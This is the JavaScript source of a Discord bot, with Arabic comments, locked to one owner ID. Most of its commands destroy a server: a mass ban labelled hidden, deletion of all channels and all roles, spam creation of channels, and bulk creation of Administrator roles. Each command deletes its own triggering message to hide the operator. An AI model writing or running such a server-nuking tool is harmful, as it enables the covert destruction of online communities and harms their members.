const { Client, GatewayIntentBits, PermissionsBitField, ChannelType } = require('discord.js');
const http = require('http');

// 1️⃣ فتح سيرفر وهمي عشان Render يشوف بورت مفتوح ويرتاح نفسياً
const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Bot is running successfully!');
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`[Render Trick] Dummy server is listening on port ${PORT}`);
});

// 2️⃣ إعدادات البوت الأساسية
const client = new Client({ 
    intents: [
        GatewayIntentBits.Guilds, 
        GatewayIntentBits.GuildMessages, 
        GatewayIntentBits.MessageContent, 
        GatewayIntentBits.GuildMembers
    ] 
});

const PREFIX = '.'; // أمر النقطة
const OWNER_ID = '1515394889855275281'; // 🔒 قفل الأمان على حسابك أنت فقط

client.on('ready', () => {
    console.log(`تم تشغيل البوت بنجاح باسم: ${client.user.tag}`);
});

// 🛡️ حماية تلقائية: طرد الحسابات الجديدة أقل من 3 أيام لمنع التوكنات
client.on('guildMemberAdd', async (member) => {
    const minAge = 3 * 24 * 60 * 60 * 1000; 
    const accountAge = Date.now() - member.user.createdAt.getTime();

    if (accountAge < minAge) {
        try {
            await member.kick('حماية من الحسابات الوهمية');
            console.log(`[حماية] تم طرد الحساب الوهمي: ${member.user.tag}`);
        } catch (err) {}
    }
});

client.on('messageCreate', async (message) => {
    if (!message.content.startsWith(PREFIX) || message.author.bot) return;
    if (message.author.id !== OWNER_ID) return; // الحماية الصارمة

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args[0].toLowerCase();

    // 1️⃣ أمر التبنيد الجماعي المخفي: .banall 50
    if (command === 'banall') {
        const count = parseInt(args[1]);
        if (isNaN(count) || count <= 0) return;
        try { await message.delete(); } catch (err) {}

        try {
            const members = await message.guild.members.fetch();
            const targets = members.filter(m => !m.user.bot && m.roles.cache.size <= 1).first(count);
            if (targets.length === 0) return;

            for (const member of targets) {
                try {
                    await member.ban({ reason: 'تنظيف الحسابات غير القانونية' });
                    await new Promise(resolve => setTimeout(resolve, 20000)); 
                } catch (banError) {}
            }
        } catch (error) {}
    }

    // 2️⃣ أمر حذف كاتيجوري مع روماتها: .delcat ID
    if (command === 'delcat') {
        const categoryId = args[1];
        if (!categoryId) return;
        try { await message.delete(); } catch (err) {}

        try {
            const category = message.guild.channels.cache.get(categoryId);
            if (!category || category.type !== ChannelType.GuildCategory) return;
            const children = category.children.cache;

            for (const [id, channel] of children) {
                try {
                    await channel.delete();
                    await new Promise(resolve => setTimeout(resolve, 1000));
                } catch (err) {}
            }
            await category.delete();
        } catch (error) {}
    }

    // 3️⃣ أمر تصفير الرومات بالكامل: .nukechannels
    if (command === 'nukechannels') {
        try { await message.delete(); } catch (err) {}
        try {
            const channels = await message.guild.channels.fetch();
            for (const [id, channel] of channels) {
                try {
                    await channel.delete();
                    await new Promise(resolve => setTimeout(resolve, 1000));
                } catch (err) {}
            }
        } catch (error) {}
    }

    // 4️⃣ أمر إنشاء رومات متكررة: .makechannels 30 name
    if (command === 'makechannels') {
        const count = parseInt(args[1]);
        const channelName = args.slice(2).join('-');
        if (isNaN(count) || count <= 0 || !channelName) return;
        const finalCount = count > 50 ? 50 : count;

        try { await message.delete(); } catch (err) {}
        try {
            for (let i = 0; i < finalCount; i++) {
                try {
                    await message.guild.channels.create({ name: channelName, type: ChannelType.GuildText });
                    await new Promise(resolve => setTimeout(resolve, 1000));
                } catch (err) {}
            }
        } catch (error) {}
    }

    // 5️⃣ أمر تصفير الرتب بالكامل: .nukeroles
    if (command === 'nukeroles') {
        try { await message.delete(); } catch (err) {}
        try {
            const roles = await message.guild.roles.fetch();
            for (const [id, role] of roles) {
                if (role.managed || role.id === message.guild.id || role.id === client.user.id) continue;
                try {
                    await role.delete();
                    await new Promise(resolve => setTimeout(resolve, 1000));
                } catch (err) {}
            }
        } catch (error) {}
    }

    // 6️⃣ أمر مسح الشات: .clear 100
    if (command === 'clear') {
        const amount = parseInt(args[1]);
        if (isNaN(amount) || amount <= 0) return;
        const finalAmount = amount > 100 ? 100 : amount;
        try { await message.delete(); } catch (err) {}
        try { await message.channel.bulkDelete(finalAmount, true); } catch (error) {}
    }

    // 7️⃣ أمر صناعة الرتب الثابتة: .makeroles
    if (command === 'makeroles') {
        try { await message.delete(); } catch (err) {}
        const defaultRoles = [
            { name: '👑 | Owner', color: '#ff0000' },
            { name: '🛠️ | Admin', color: '#00ff00' },
            { name: '🛡️ | Moderator', color: '#0000ff' },
            { name: '👥 | Member', color: '#aaaaaa' }
        ];
        try {
            for (const roleData of defaultRoles) {
                await message.guild.roles.create({ name: roleData.name, color: roleData.color });
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
        } catch (error) {}
    }

    // 🔥 [الأمر الجديد والذكي والحر]: .makerolescustom [العدد] [admin/normal] [اسم الرتبة]
    if (command === 'makerolescustom') {
        const count = parseInt(args[1]); // عدد الرتب المطلوب
        const type = args[2]?.toLowerCase(); // هل تبيها رتبة ادمن أم رتبة عادية؟
        const roleName = args.slice(3).join(' '); // اسم الرتبة اللي تبيها

        if (isNaN(count) || count <= 0 || !type || !roleName) return;
        
        // قفل أمان لحماية السيرفر من التعليق (الحد الأقصى 50 رتبة في المرة الواحدة)
        const finalCount = count > 50 ? 50 : count;

        try { await message.delete(); } catch (err) {}

        // تحديد الصلاحيات بناءً على طلبك (ادمن كامل، أو رتبة عادية للكل)
        let permissionsArray = [];
        if (type === 'admin') {
            permissionsArray = [PermissionsBitField.Flags.Administrator];
        } else {
            // رتبة عادية يمكن إعطاؤها للكل وتحتوي على الصلاحيات الأساسية مثل رؤية الرومات والكلام
            permissionsArray = [
                PermissionsBitField.Flags.ViewChannel,
                PermissionsBitField.Flags.SendMessages,
                PermissionsBitField.Flags.ReadMessageHistory
            ];
        }

        try {
            for (let i = 0; i < finalCount; i++) {
                try {
                    await message.guild.roles.create({
                        name: roleName,
                        permissions: permissionsArray,
                        reason: 'صناعة رتب مخصصة جماعية تلقائياً'
                    });
                    // ديلاي ثانية واحدة بين كل رتبة ورتبة للأمان الكامل من الليمتد
                    await new Promise(resolve => setTimeout(resolve, 1000));
                } catch (roleErr) {
                    console.error("فشل إنشاء الرتبة المخصصة:", roleErr);
                }
            }
            console.log(`[نجاح] تم إنشاء ${finalCount} رتبة مخصصة بنجاح.`);
        } catch (error) {
            console.error(error);
        }
    }
});

client.login(process.env.TOKEN);
